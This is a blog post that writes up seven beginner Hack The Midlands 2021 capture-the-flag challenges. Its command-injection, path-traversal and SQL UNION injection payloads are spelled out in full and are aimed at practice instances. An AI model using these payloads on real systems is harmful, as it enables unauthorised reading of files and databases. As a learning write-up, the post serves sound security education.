<!doctype html><html lang=en><head><title>Hack The Midlands CTF 2021 :: The Tymscar Blog</title>
<meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="I participated in this year's HTM CTF. Here is my experience!"><meta name=keywords content="ctf,linux,hacking,technical"><meta name=robots content="noodp"><link rel=canonical href=/posts/hackthemidlandsctf2021/><link rel=stylesheet href=/assets/style.css><link rel=stylesheet href=/assets/blue.css><link rel=apple-touch-icon href=/img/apple-touch-icon-192x192.png><link rel="shortcut icon" href=/img/favicon/favicon.ico><meta name=twitter:card content="summary"><meta name=twitter:site content="google.com"><meta name=twitter:creator content="tymscar"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Hack The Midlands CTF 2021"><meta property="og:description" content="I participated in this year's HTM CTF. Here is my experience!"><meta property="og:url" content="/posts/hackthemidlandsctf2021/"><meta property="og:site_name" content="The Tymscar Blog"><meta property="og:image" content="/img/favicon/favicon.ico"><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:published_time" content="2021-10-31 18:12:13 +0100 +0100"></head><body class=blue><div class="container center headings--one-size"><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>Tymscar</div></a></div></div></header><div class=content><div class=post><h1 class=post-title><a href=/posts/hackthemidlandsctf2021/>Hack The Midlands CTF 2021</a></h1><div class=post-meta><span class=post-date>2021-10-31
</span><span class=post-author>:: Oscar Molnar</span></div><span class=post-tags>#<a href=/tags/ctf/>ctf</a>&nbsp;
#<a href=/tags/linux/>linux</a>&nbsp;
#<a href=/tags/hacking/>hacking</a>&nbsp;
#<a href=/tags/technical/>technical</a>&nbsp;</span><div class=post-content><div><p><a href=https://hackthemidlands.com/>HackTheMidlands</a> is a 24-hour hackathon, or ‚Äúcreative marathon‚Äù, which was founded in 2016.
I used to participate back in the day, and I&rsquo;ve even won a prize before, <a href="https://www.youtube.com/watch?v=mvLXkCgsXik">here</a> you can find a video about it! üì∑</p><h3 id=ctfs>CTFsüèÅ:<a href=#ctfs class=hanchor arialabel=Anchor>&#8983;</a></h3><p>Being a programmer at heart I&rsquo;ve never played seriously with <a href=https://www.hackthebox.com/blog/what-is-ctf>capture the flag</a> challenges before, but because I am busy with work I did not have the time and energy to participate in the coding part of the hackathon, so I thought I&rsquo;ll give the CTF a try! It was a lot of fun for someone starting out with CTFs but with a good grasp of <code>*nix</code> systems, programming, and web development!</p><h1 id=writeup-of-the-challenges-of-this-year->Writeup of the challenges of this year üíª:<a href=#writeup-of-the-challenges-of-this-year- class=hanchor arialabel=Anchor>&#8983;</a></h1><p>There were 7 challenges in total this year, with varying difficulties denoted by points from <code>5</code> to <code>20</code>.</p><p>Some of the challenges required the <code>hacker</code> to download some file and mess around with it in some way and the others presented the user with a hosted <code>docker</code> instance. In the case of the docker instance, the hacker did not have to employ any other tools besides his browser. I found this to be very nice for a new user.</p><h1 id=challenge-1-find-me-5pt>Challenge #1: Find Me (5pt)<a href=#challenge-1-find-me-5pt class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Description:</p><pre tabindex=0><code>There&#39;s something about this image that is more than meets the eye.
</code></pre><p>Attached to this was an image:
<img src=/htm-2021/findme.png alt=findMe></p><p>Photography is one of my most loved hobbies so I knew this had to be one of three things.</p><ol><li>There was something hidden in the text when you open up the image as a text file. This was not it. The file looked like gibberish with no sight of the flag:
<img src=/htm-2021/findMeGibberish.png alt=findMeGibberish></li><li>Sometimes when you adjust the file&rsquo;s brightness or contrast you can see some hidden text. This was unlikely to be the case because then you would have to type the CTF flag manually. I tried it regardless without any success.</li><li>The file had some <a href=https://en.wikipedia.org/wiki/Exif>EXIF</a> data about it. I went to an online <a href=http://metapicz.com/#landing>EXIF viewer</a> and lo and behold, the flag <code>HTM{EXIF_GRABBED}</code> was there:
<img src=/htm-2021/findMeExif.png alt=findMeExif></li></ol><h1 id=challenge-2-pingit-5pt>Challenge #2: PingIT (5pt)<a href=#challenge-2-pingit-5pt class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Description:</p><pre tabindex=0><code>TotallySecure Limited have developed an internal tool to check the availability of a host on their network.
Can you find any vulnerabilities with this?
**Note, any flags are located in /home/cmnatic/ with the formatting of HTM{}**
</code></pre><p>This is what the website looked like upon visiting it:</p><p><img src=/htm-2021/pingitsite.png alt=pingitsite></p><p>It`s quite clear that the website takes the user input and passes it to the ping command directly, something like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ping 127.0.0.1
</span></span></code></pre></div><p>In <code>bash</code> if you want to run two commands one after the other, you can use the <code>;</code> sign between them. So I tried to run <code>uname</code> which should return the kernel name I am running on that machine. And it did!</p><p><img src=/htm-2021/pingmeuname.png alt=pingmeuname></p><p>It says in the description that the flag is located in <code>/home/cmnatic</code>. I just don&rsquo;t know what the name of the file is, so I ran</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>1; ls /home/cmnatic
</span></span></code></pre></div><p>And the server told me that the file is called <code>flag.txt</code>. Should`ve known&mldr;
All that is left now is to read the flag with:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>1; cat /home/cmnatic/flag.txt
</span></span></code></pre></div><p>Tada! We got the flag: <code>HTM{COMMAND_INJECTION}</code></p><h1 id=challenge-3-commitment-issues-15pt>Challenge #3: Commitment Issues (15pt)<a href=#challenge-3-commitment-issues-15pt class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Description:</p><pre tabindex=0><code>Joe Bloggs -
developer extroadinare, has some commitment issues and seems to share too much.
Can you help him prevent this in the future?
</code></pre><p>Attached we have a zip file, with a git project inside.
I tried running <code>grep</code> over the file and looking for <code>HTM{</code> but I couldn`t find anything.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>tymscar@machine:/home/Tymscar/BikeIT$ grep -rni <span style=color:#e6db74>&#34;HTM{&#34;</span> *
</span></span><span style=display:flex><span>tymscar@machine:/home/Tymscar/BikeIT$
</span></span></code></pre></div><p>It was pretty clear based on the fact that this was a git project and the challenge title that the flag had something to do with the commits inside of it, so I ran <code>git log</code> and I could see that there was actually another commit which could hide the flag.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>tymscar@machine:/home/Tymscar/BikeIT$ git log
</span></span><span style=display:flex><span>commit eed89b082d6ae5694caa55a4bfe232f866311634 <span style=color:#f92672>(</span>HEAD -&gt; main, origin/main<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Author: Ben <span style=color:#f92672>(</span>CMNatic<span style=color:#f92672>)</span> &lt;ben@cmnatic.co.uk&gt;
</span></span><span style=display:flex><span>Date:   Wed Oct <span style=color:#ae81ff>27</span> 12:12:20 <span style=color:#ae81ff>2021</span> +0100
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Update databaseconfig.php
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>commit b574d38d27ce5646bf69c28e02ac6f8656c19d2d
</span></span><span style=display:flex><span>Author: Ben <span style=color:#f92672>(</span>CMNatic<span style=color:#f92672>)</span> &lt;ben@cmnatic.co.uk&gt;
</span></span><span style=display:flex><span>Date:   Wed Oct <span style=color:#ae81ff>27</span> 10:02:38 <span style=color:#ae81ff>2021</span> +0100
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Initial Commit
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>commit b9620c9fbfb1ee3714a79fc2d116bff03918a181
</span></span><span style=display:flex><span>Author: Ben <span style=color:#f92672>(</span>CMNatic<span style=color:#f92672>)</span> &lt;ben@cmnatic.co.uk&gt;
</span></span><span style=display:flex><span>Date:   Wed Oct <span style=color:#ae81ff>27</span> 09:58:52 <span style=color:#ae81ff>2021</span> +0100
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Initial commit
</span></span></code></pre></div><p>I switched to it, tried grepping for the flag again and, success: <code>HTM{COMMITTED_CREDENTIALS}</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>tymscar@machine:/home/Tymscar/BikeIT$ git checkout b574d38d27ce5646bf69c28e02ac6f8656c19d2d
</span></span><span style=display:flex><span>Note: switching to <span style=color:#e6db74>&#39;b574d38d27ce5646bf69c28e02ac6f8656c19d2d&#39;</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>HEAD is now at b574d38 Initial Commit
</span></span><span style=display:flex><span>tymscar@machine:/home/Tymscar/BikeIT$ grep -rni <span style=color:#e6db74>&#34;HTM{&#34;</span> *
</span></span><span style=display:flex><span>php/databaseconfig.php:5:$password<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;HTM{COMMITTED_CREDENTIALS}&#34;</span>; //change this
</span></span></code></pre></div><h1 id=challenge-4totally-cool-bookings-10pt>Challenge #4:Totally Cool Bookings (10pt)<a href=#challenge-4totally-cool-bookings-10pt class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Description:</p><pre tabindex=0><code>Totally Cool Bookings are excited to show off their new app!
It makes bookings totally cool and easy.
Find the vulnerability on their site to answer the flag.
**Note, flags for this are with the formatting of HTM{}**
and are located in a users home directory
</code></pre><p>This is what the website looked like upon visiting it:</p><p><img src=/htm-2021/coolbookingsinital.png alt=coolbookingsinital></p><p>The first thing I noticed instantly while playing with the webpage was that when I went to the <code>about</code> page, it would not load, but instead, it would error at the bottom of the page:
<img src=/htm-2021/coolbookingserror.png alt=coolbookingserror></p><p>The error had a full path to where the page should&rsquo;ve been <code>/opt/web/about.html</code>. Does this mean we can just change the URL and relatively go back to root and then climb back up to the location of where the flag was in <code>Challenge 2</code>? Let&rsquo;s try: <code>{dockerinstanceURL}/home?page=../../../home/cmnatic/flag.txt</code>
<img src=/htm-2021/coolbookingssuccess.png alt=coolbookingssuccess></p><p>What do you know? We found the flag: <code>HTM{INJECTION_SUCCESS}</code>!</p><h1 id=challenge-5-deep-dive-15pt>Challenge #5: Deep Dive (15pt)<a href=#challenge-5-deep-dive-15pt class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Description:</p><pre tabindex=0><code>The DevOps team left a flag behind.
Can you re-assemble this and find the flag?

Note, any flags are located in /home/cmnatic/ with the formatting of HTM{}
</code></pre><p>Attached we have a zip file, with a docker project inside. Normally, I would&rsquo;ve tried to run the docker file and see where it would take me, but a simple</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>grep -rni <span style=color:#e6db74>&#34;HTM{.*}&#34;</span> *
</span></span></code></pre></div><p>returned me the flag <code>HTM{DOCKER_DIVE}</code> so I was happy enough:
<img src=/htm-2021/deepdive.png alt=deepdive></p><h1 id=challenge-6-flag-checker-10pt>Challenge #6: Flag Checker (10pt)<a href=#challenge-6-flag-checker-10pt class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Description:</p><pre tabindex=0><code>The lazy developer has left this broken file behind.
Can you find the flag?
</code></pre><p>Attached we have a zip file, with a single file inside.
The first thing I did was try to see what kind of file it is:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>tymscar@machine:/home/Tymscar/flagchecker$ file flagchecker
</span></span><span style=display:flex><span>flagchecker: assembler source, ASCII text
</span></span></code></pre></div><p>Being an ASCII file, I did what you probably guessed:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>tymscar@machine:/home/Tymscar/flagchecker$ cat flagchecker | grep <span style=color:#e6db74>&#34;HTM{.*}&#34;</span>
</span></span><span style=display:flex><span>HTM<span style=color:#f92672>{</span>CORE_DU<span style=color:#f92672>}</span>
</span></span></code></pre></div><p>And there it was, <code>HTM{CORE_DU}</code>, the flag!</p><h1 id=challenge-7-address-book-20pt>Challenge #7: Address Book (20pt)<a href=#challenge-7-address-book-20pt class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Description:</p><pre tabindex=0><code>Alice is trying to find the contact details for **Joe Bloggs**.
Can you help here?
I hear the address book contains more then just contact details!
</code></pre><p>This is what the website looked like upon visiting it and searching for the person hinted in the description:</p><p><img src=/htm-2021/addressbook.png alt=addressbook></p><p>Searching for any other random name did not yield any results. I knew this was accessing data inside of some sort of database, so I tried my hand at doing an SQL injection attack.
My train of thought was that because this is a simple docker instance it might just use SQLite. If it does it should respond to <code>sqlite_version()</code> with the version it has, if it doesn&rsquo;t, then I could try other variants of SQL and their specific commands.</p><p>But how would I be able to run that?
Well, I could assume that the SQL command on the backend looks something like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>select</span> <span style=color:#f92672>*</span> <span style=color:#66d9ef>from</span> sometablethatIdontknow <span style=color:#66d9ef>where</span> name<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;{USERINPUT}&#39;</span>
</span></span></code></pre></div><p>I can add anything as USERINPUT, so I will close out the quotes, get rid of the answer by <code>AND</code>ing it with a false statement, and using a union to select the version I am looking for:</p><pre tabindex=0><code>blahblah&#39; AND 1=2 UNION SELECT sqlite_version(), 1, 1 --
</code></pre><p>This interanlly it would look like:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>select</span> <span style=color:#f92672>*</span> <span style=color:#66d9ef>from</span> sometablethatIdontknow <span style=color:#66d9ef>where</span> name<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;blahblah&#39;</span> <span style=color:#66d9ef>AND</span> <span style=color:#ae81ff>1</span><span style=color:#f92672>=</span><span style=color:#ae81ff>2</span> <span style=color:#66d9ef>UNION</span> <span style=color:#66d9ef>SELECT</span> sqlite_version(), <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span> <span style=color:#75715e>--&#39;
</span></span></span></code></pre></div><p>The other 2 <code>1</code>&rsquo;s there I need just to be able to fully populate the table on the website which needs 3 elements in total.</p><p>I got lucky! The database was in fact an SQLite database and it returned its version:
<img src=/htm-2021/addressbookversion.png alt=addressbookversion></p><p>Now that we know what database there is, I can always query all the table names. To do that in SQL, my input became:</p><pre tabindex=0><code>blahblah&#39; AND 1=2 UNION SELECT name, 1, 1 FROM sqlite_master WHERE type = &#34;table&#34; --
</code></pre><p>which in turn on the backend side looked something like:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>select</span> <span style=color:#f92672>*</span> <span style=color:#66d9ef>from</span> sometablethatIdontknow <span style=color:#66d9ef>where</span> name<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;blahblah&#39;</span> <span style=color:#66d9ef>AND</span> <span style=color:#ae81ff>1</span><span style=color:#f92672>=</span><span style=color:#ae81ff>2</span> <span style=color:#66d9ef>UNION</span> <span style=color:#66d9ef>SELECT</span> name, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>FROM</span> sqlite_master <span style=color:#66d9ef>WHERE</span> <span style=color:#66d9ef>type</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;table&#34;</span> <span style=color:#75715e>--&#39;
</span></span></span></code></pre></div><p>This returned the name of the tables available in that database. There is a <code>flag</code> table! That&rsquo;s what we want. To list everything inside of it, we do the last injection:</p><pre tabindex=0><code>blahblah&#39; AND 1=2 UNION SELECT *, 1, 1 FROM flag--
</code></pre><p>which then in turn on the backend side would look like:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>select</span> <span style=color:#f92672>*</span> <span style=color:#66d9ef>from</span> addressbook <span style=color:#66d9ef>where</span> name<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;blahblah&#39;</span> <span style=color:#66d9ef>AND</span> <span style=color:#ae81ff>1</span><span style=color:#f92672>=</span><span style=color:#ae81ff>2</span> <span style=color:#66d9ef>UNION</span> <span style=color:#66d9ef>SELECT</span> <span style=color:#f92672>*</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>FROM</span> flag<span style=color:#75715e>--&#39;
</span></span></span></code></pre></div><p>That was it! The flag, <code>HTM{ADDRESS_BOOK_INJECTION}</code> was mine!
<img src=/htm-2021/addressbookflag.png alt=addressbookflag></p><h1 id=in-conclusion>In conclusion<a href=#in-conclusion class=hanchor arialabel=Anchor>&#8983;</a></h1><p>I enjoyed these challenges very much! The last one was especially hard because I had to poke around with SQL injection about which I heard before but I&rsquo;ve never done myself.
The best advice I could give to anybody that wants to try some of these is just <code>go for it</code> and don&rsquo;t be afraid to Google everything you don`t understand. After all, it is a great learning experience!</p><p>See you next time!</p></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=/posts/jetbrainsremotedevservernixos/><span class=button__icon>‚Üê</span>
<span class=button__text>Running Jetbrains remote dev servers on NixOS</span></a></span></div></div></div></div><footer class=footer><div class=footer__inner><div class=copyright><span>¬© 2025 Powered by <a href=http://gohugo.io>Hugo</a></span>
<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=/assets/main.js></script><script src=/assets/prism.js></script></div></body></html>